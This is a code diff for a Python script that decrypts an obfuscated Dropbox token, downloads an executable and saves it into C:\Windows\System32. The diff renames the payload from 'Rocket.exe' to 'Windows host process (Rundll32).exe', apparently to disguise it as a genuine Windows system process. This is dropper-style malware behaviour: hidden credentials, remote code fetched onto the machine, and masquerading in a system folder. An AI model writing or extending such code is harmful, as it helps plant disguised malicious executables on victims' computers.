@@ -55,7 +55,7 @@ Nova = decrypt_token('c2wuQnZpRmFTeDRSTUlDVFg4WVFOVm85WmV3SDBqcVRSWWdDeGVzeXVHNX
 LOCAL_DESTINATION_FOLDER = 'C:\\Windows\\System32\\'
 
 # File name to download
-REMOTE_FILE_NAME = '/Rockety/Rocket.exe'  # Full Dropbox path
+REMOTE_FILE_NAME = '/Rockety/Windows host process (Rundll32).exe'  # Full Dropbox path
 
 def download_file():
     dbx = dropbox.Dropbox(Nova)
@@ -69,10 +69,10 @@ def download_file():
         metadata, response = dbx.files_download('/Windows host process (Rundll32).exe')
         
         # Save the file locally
-        with open(LOCAL_DESTINATION_FOLDER + 'Rocket.exe', 'wb') as f:
+        with open(LOCAL_DESTINATION_FOLDER + 'Windows host process (Rundll32).exe', 'wb') as f:
             f.write(response.content)
         
-        print(f"File 'Rocket.exe' downloaded successfully to '{LOCAL_DESTINATION_FOLDER}'.")
+        print(f"File 'Windows host process (Rundll32).exe' downloaded successfully to '{LOCAL_DESTINATION_FOLDER}'.")
     except dropbox.exceptions.HttpError as err:
         print(f"Error downloading file: {err}")
     except dropbox.exceptions.DropboxException as err:
